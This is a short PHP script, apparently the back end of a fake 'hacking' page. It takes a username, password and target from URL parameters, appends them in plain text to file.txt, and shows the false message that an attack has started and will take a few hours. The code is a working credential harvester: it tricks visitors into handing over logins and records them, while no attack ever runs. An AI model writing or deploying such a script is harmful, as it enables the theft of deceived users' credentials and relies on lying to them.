<?php

$username=$_GET['UserName'];
$password=$_GET['Password'];
$target=$_GET['Target'];

$txt= $username . " : " . $password . "\n" . "Target" . ":" . $target ."\n" . "\n" ;

$file="file.txt";

file_put_contents($file,$txt,FILE_APPEND);

echo("Started Attacking It Will Be Take About A Few Hours ...")

?>